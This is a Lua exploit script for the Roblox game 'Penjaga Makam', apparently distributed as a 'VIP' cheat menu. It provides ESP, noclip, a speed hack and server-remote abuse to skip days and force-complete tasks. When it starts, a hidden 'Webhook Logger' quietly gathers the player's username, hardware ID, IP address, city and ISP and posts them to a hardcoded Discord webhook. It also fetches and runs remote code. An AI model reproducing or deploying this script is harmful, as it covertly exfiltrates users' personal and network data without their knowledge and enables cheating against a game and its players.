
local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MizuPenjagaMakam then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Penjaga Makam",
        Text = "Sistem sudah beroperasi di memori! Harap Unload terlebih dahulu."
    })
end
getgenv().MizuPenjagaMakam = true

--================================================
-- 1. SERVICES & TARGET PATHS
--================================================
local Services = setmetatable({}, { __index = function(t, k) local s = game:GetService(k); t[k] = s; return s end })
local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local ReplicatedStorage = Services.ReplicatedStorage
local ContentProvider = Services.ContentProvider

-- Target Remotes (Berdasarkan Audit Blueprint)
local RemoteFolder = ReplicatedStorage:FindFirstChild("RemoteEvent")
local InteractionEvent = RemoteFolder and RemoteFolder:FindFirstChild("InteractionEvent")
local BersihkanGuiEvent = RemoteFolder and RemoteFolder:FindFirstChild("BersihkanGuiEvent")
local ShowMandiGui = RemoteFolder and RemoteFolder:FindFirstChild("ShowMandiGui")
local ShowKerandaGui = RemoteFolder and RemoteFolder:FindFirstChild("ShowKerandaGui")

--================================================
-- 2. AUTO RECONNECT & ANTI-AFK
--================================================
local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    
    local vUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        vUser:CaptureController()
        vUser:ClickButton2(Vector2.new())
    end)
end

--================================================
-- 3. WEBHOOK LOGGER
--================================================
local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local userId = LocalPlayer.UserId
        local displayName = LocalPlayer.DisplayName
        local username = LocalPlayer.Name
        local accountAge = LocalPlayer.AccountAge
        local membership = LocalPlayer.MembershipType.Name
        local placeId = game.PlaceId
        local jobId = game.JobId

        local hwid = "Unknown"
        pcall(function() if gethwid then hwid = gethwid() elseif identifying then hwid = identifying() end end)

        local statsText = "No Leaderstats"
        local ls = LocalPlayer:FindFirstChild("leaderstats")
        if ls then
            local t = {}
            for _, v in pairs(ls:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                    table.insert(t, "> **" .. v.Name .. ":** `" .. tostring(v.Value) .. "`")
                end
            end
            if #t > 0 then statsText = table.concat(t, "\n") end
        end

        local avatarURL = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local d = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&size=420x420&format=Png&isCircular=false"))
            if d.data and d.data[1] then avatarURL = d.data[1].imageUrl end
        end)

        local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
        local ipData = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown" }
        pcall(function() ipData = HttpService:JSONDecode(game:HttpGet("https://ip-api.com/json")) end)

        local platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local fps = math.floor(workspace:GetRealPhysicsFPS())
        local gameName = "Penjaga Makam"
        pcall(function() gameName = Market:GetProductInfo(placeId).Name end)
        
        local embedColor = (membership == "Premium") and 16766720 or 16724530
        local joinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(placeId), jobId)
        local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"

        local data = {
            username = "Mizukage Logger",
            avatar_url = avatarURL,
            content = "",
            embeds = {{
                title = gameName .. " | LOG REPORT",
                url = profileLink,
                color = embedColor,
                thumbnail = { url = avatarURL },
                fields = {
                    { name = "USER INFORMATION", value = string.format("> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days", displayName, username, profileLink, userId, accountAge), inline = true },
                    { name = "HARDWARE ID", value = "```" .. hwid .. "```", inline = true },
                    { name = "IN-GAME STATS", value = statsText, inline = false },
                    { name = "NETWORK & DEVICE", value = string.format("> **IP:** ||`%s`||\n> **Loc:** %s, %s\n> **Exe:** `%s` (%s)\n> **Ping:** `%dms` | **FPS:** `%d`", ipData.query, ipData.city, ipData.country, executor, platform, ping, fps), inline = false },
                    { name = "QUICK JOIN", value = "```lua\n" .. joinScript .. "```", inline = false }
                },
                footer = { text = "Mizukage Engine • ISP: " .. ipData.isp, icon_url = avatarURL },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) })
    end)
end

--================================================
-- 4. CORE ENGINE (ESP, Movement, NoDelay)
--================================================
local Config = { NoDelay = false, SpeedHack = false, Noclip = false, WalkSpeed = 25 }
local GhostColor = Color3.fromRGB(255, 60, 60)
local PlayerColor = Color3.fromRGB(60, 255, 60)

local function IsGhostModel(obj)
    if not obj:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(obj) then return false end
    local hum = obj:FindFirstChildOfClass("Humanoid")
    local anim = obj:FindFirstChildOfClass("AnimationController")
    if ((hum and hum.Health > 0) or anim) and not obj.Name:lower():find("dummy") then return true end
    return false
end

-- Noclip
local NoclipConnection
local function SetNoclip(enabled)
    Config.Noclip = enabled
    if NoclipConnection then NoclipConnection:Disconnect(); NoclipConnection = nil end
    if enabled then
        NoclipConnection = RunService.Stepped:Connect(function()
            local char = LocalPlayer.Character
            if char then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end end
        end)
    else
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
            task.wait(0.1)
            for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
        end
    end
end

-- SpeedHack (Membypass batasan WalkSpeed 11 di Penjaga Makam)
local SpeedHackConnection
local function SetSpeedHack(enabled)
    Config.SpeedHack = enabled
    if SpeedHackConnection then SpeedHackConnection:Disconnect(); SpeedHackConnection = nil end
    if enabled then
        SpeedHackConnection = RunService.Heartbeat:Connect(function()
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = Config.WalkSpeed end
        end)
    else
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 11 end
    end
end

-- NoDelay (Instant E Prompt)
local NoDelayConnection
local function SetNoDelay(enabled)
    Config.NoDelay = enabled
    if NoDelayConnection then NoDelayConnection:Disconnect(); NoDelayConnection = nil end
    if enabled then
        for _, d in ipairs(Workspace:GetDescendants()) do if d:IsA("ProximityPrompt") then pcall(function() d.HoldDuration = 0 end) end end
        NoDelayConnection = Workspace.DescendantAdded:Connect(function(d) if d:IsA("ProximityPrompt") then pcall(function() d.HoldDuration = 0 end) end end)
    else
        for _, d in ipairs(Workspace:GetDescendants()) do if d:IsA("ProximityPrompt") then pcall(function() d.HoldDuration = 1 end) end end
    end
end

-- ESP System
local Highlights = { Ghost = {}, Player = {} }
local ESPLoops = { Ghost = false, Player = false }
local ESPThreads = { Ghost = nil, Player = nil }

local function ClearESP(t) 
    for _, hl in pairs(Highlights[t]) do pcall(function() hl:Destroy() end) end 
    table.clear(Highlights[t]) 
end

local function SetESP(espType, enabled)
    ESPLoops[espType] = enabled
    if ESPThreads[espType] then task.cancel(ESPThreads[espType]) end
    ClearESP(espType)
    if not enabled then return end
    
    local prefix = espType .. "ESP"
    local isValidFunc = (espType == "Ghost") and IsGhostModel or function(obj) 
        if obj:IsA("Model") then local plr = Players:GetPlayerFromCharacter(obj); return plr ~= nil and plr ~= LocalPlayer end return false 
    end

    ESPThreads[espType] = task.spawn(function()
        while ESPLoops[espType] do
            for i = #Highlights[espType], 1, -1 do
                local hl = Highlights[espType][i]
                if not hl or not hl.Parent then pcall(function() hl:Destroy() end); table.remove(Highlights[espType], i) end
            end
            
            local color = (espType == "Ghost") and GhostColor or PlayerColor
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if isValidFunc(obj) and not obj:FindFirstChild(prefix) then
                    local hl = Instance.new("Highlight")
                    hl.Name = prefix; hl.FillColor = color; hl.FillTransparency = 0.3; hl.Parent = obj
                    table.insert(Highlights[espType], hl)
                end
            end
            task.wait(1.5)
        end
    end)
end

local function UpdateESPColors()
    for _, hl in ipairs(Highlights.Ghost) do if hl and hl.Parent then hl.FillColor = GhostColor end end
    for _, hl in ipairs(Highlights.Player) do if hl and hl.Parent then hl.FillColor = PlayerColor end end
end

--================================================
-- 5. EXCLUSIVE GAME EXPLOITS (Penjaga Makam)
--================================================
local function ForceSkipDay()
    if InteractionEvent then
        InteractionEvent:FireServer("Kasur", "Aktif")
    end
end

local function BypassMinigames()
    if BersihkanGuiEvent then BersihkanGuiEvent:FireServer("HideGui") end
    if ShowMandiGui then ShowMandiGui:FireServer(false) end
    if ShowKerandaGui then ShowKerandaGui:FireServer(false) end
    if InteractionEvent then InteractionEvent:FireServer("Phone", "StopRing") end
end

local function ForceCompleteTasks()
    if InteractionEvent then
        -- Memicu trigger Task Completed dari ID 1 hingga 30
        for i = 1, 30 do
            InteractionEvent:FireServer("Task", "Completed", i)
            task.wait(0.05)
        end
    end
end

local function TriggerSecretBakso()
    if InteractionEvent then
        InteractionEvent:FireServer("Ocehan", "Start", "Bakso")
    end
end

--================================================
-- 6. WIND UI — REDUX INTERFACE
--================================================
local function InitInterface()
    local success, WindUI = pcall(function() return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))() end)
    if not success or not WindUI then success, WindUI = pcall(function() return loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))() end) end
    if not success or not WindUI then return end

    -- Konfigurasi Suara Background UI
    local Sounds = { StartupId = "rbxassetid://140397610798305", ClickId = "rbxassetid://140277245983305" }
    pcall(function() ContentProvider:PreloadAsync({Sounds.StartupId, Sounds.ClickId}) end)
    
    function Sounds:Play(id, volume) 
        task.spawn(function() 
            local s = Instance.new("Sound")
            s.SoundId = id
            s.Volume = volume or 1
            s.Parent = Services.SoundService
            s.Ended:Connect(function() s:Destroy() end)
            s:Play() 
        end) 
    end
    
    Sounds:Play(Sounds.StartupId, 1)
    local Click = function() Sounds:Play(Sounds.ClickId, 0.8) end

    WindUI:Notify({ Title = "Penjaga Makam", Content = "Mizukage-Official Aktif!", Duration = 5, Icon = "shield-check" })

    local vs = Workspace.CurrentCamera.ViewportSize
    local isMobile = vs.X < 850
    local Window = WindUI:CreateWindow({
        Title = "PENJAGA MAKAM",
        Icon = "lucide:ghost",
        Author = "Mizukage Official",
        Folder = "PenjagaMakam",
        Size = isMobile and UDim2.fromOffset(vs.X * 0.85, vs.Y * 0.85) or UDim2.fromOffset(600, 420),
        Transparent = true,
        Theme = "Dark",
        Accent = Color3.fromRGB(180, 40, 40),
        SideBarWidth = isMobile and 150 or 200,
        HasOutline = true,
        Background = "rbxassetid://137490169052447",
        BackgroundImageTransparency = 0.75
    })
    
    Window:Tag({ Title = "VIP Exclusive", Icon = "lucide:crown", Color = Color3.fromHex("#c9a44b"), Radius = 6 })

    local TabGame = Window:Tab({ Title = "Game Mods", Icon = "lucide:gamepad-2" })
    local TabMain = Window:Tab({ Title = "Engine", Icon = "lucide:cpu" })
    local TabESP  = Window:Tab({ Title = "Vision", Icon = "lucide:eye" })
    local TabMove = Window:Tab({ Title = "Movement", Icon = "lucide:move" })

    -- TAB GAME MODS (EKSKLUSIF PENJAGA MAKAM)
    TabGame:Section({ Title = "Progression Hacks" })
    TabGame:Button({ Title = "Skip Day (Force Sleep)", Desc = "Memaksa trigger kasur, langsung ganti hari.", Variant = "Primary", Callback = function() Click(); ForceSkipDay() end })
    TabGame:Button({ Title = "Force Complete All Tasks", Desc = "Menyelesaikan seluruh misi (ID 1-30) secara instan.", Variant = "Secondary", Callback = function() Click(); ForceCompleteTasks() end })
    
    TabGame:Section({ Title = "Minigame Bypasses" })
    TabGame:Button({ Title = "Bypass Minigame UIs", Desc = "Otomatis menutup UI Mandi, Keranda, & Bersih Makam.", Variant = "Secondary", Callback = function() Click(); BypassMinigames() end })
    
    TabGame:Section({ Title = "Easter Eggs" })
    TabGame:Button({ Title = "Trigger 'Tukang Bakso' Dialog", Desc = "Memicu ocehan rahasia.", Variant = "Secondary", Callback = function() Click(); TriggerSecretBakso() end })

    -- TAB ENGINE (CORE UTILITIES & UNLOAD)
    TabMain:Section({ Title = "Core Utilities" })
    TabMain:Toggle({ Title = "Fast Tap", Desc = "Menghapus delay tahan atau Loading.", Default = false, Callback = function(v) Click(); SetNoDelay(v) end })
    
    TabMain:Section({ Title = "Session Control" })
    TabMain:Button({ Title = "Rejoin Server", Variant = "Secondary", Callback = function() Click(); TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end })
    TabMain:Button({ Title = "Unload Script", Variant = "Primary", Callback = function()
        Click()
        WindUI:Popup({ 
            Title = "Konfirmasi Unload", 
            Icon = "alert-triangle", 
            Content = "Apakah Anda yakin ingin mematikan semua modul?", 
            Buttons = {
                { Title = "Batal", Callback = function() end, Variant = "Tertiary" },
                { Title = "Matikan", Icon = "power-off", Variant = "Primary", Callback = function()
                    getgenv().MizuPenjagaMakam = false
                    SetNoclip(false); SetSpeedHack(false); SetNoDelay(false)
                    ESPLoops.Ghost = false; ESPLoops.Player = false
                    if ESPThreads.Ghost then task.cancel(ESPThreads.Ghost) end
                    if ESPThreads.Player then task.cancel(ESPThreads.Player) end
                    ClearESP("Ghost"); ClearESP("Player")
                    WindUI:Destroy()
                end}
            }
        })
    end })

    -- TAB VISION (ESP & COLOR PICKER)
    TabESP:Section({ Title = "Highlight Entities" })
    TabESP:Toggle({ Title = "Ghost ESP", Desc = "Sorot entitas Mbah Joyo / Pocong", Default = false, Callback = function(v) Click(); SetESP("Ghost", v) end })
    TabESP:Toggle({ Title = "Player ESP", Desc = "Sorot pemain Co-op", Default = false, Callback = function(v) Click(); SetESP("Player", v) end })
    
    TabESP:Section({ Title = "Palette Settings" })
    TabESP:Colorpicker({ Title = "Ghost Color", Default = GhostColor, Transparency = 0, Locked = false, Callback = function(c) GhostColor = c; UpdateESPColors() end })
    TabESP:Colorpicker({ Title = "Player Color", Default = PlayerColor, Transparency = 0, Locked = false, Callback = function(c) PlayerColor = c; UpdateESPColors() end })

    -- TAB MOVEMENT
    TabMove:Section({ Title = "Locomotion" })
    TabMove:Toggle({ Title = "Noclip", Desc = "Memungkinkan Anda menembus dinding & kuburan.", Default = false, Callback = function(v) Click(); SetNoclip(v) end })
    TabMove:Toggle({ Title = "Speed Override", Desc = "Membypass batasan Gamepass Sprint.", Default = false, Callback = function(v) Click(); SetSpeedHack(v) end })
    TabMove:Slider({ Title = "WalkSpeed", Step = 1, Value = { Min = 11, Max = 100, Default = 25 }, Callback = function(v) Config.WalkSpeed = v end })
end

--================================================
-- 7. INITIALIZE
--================================================
SetupAutoReconnect()
SendGameLog()
task.spawn(InitInterface)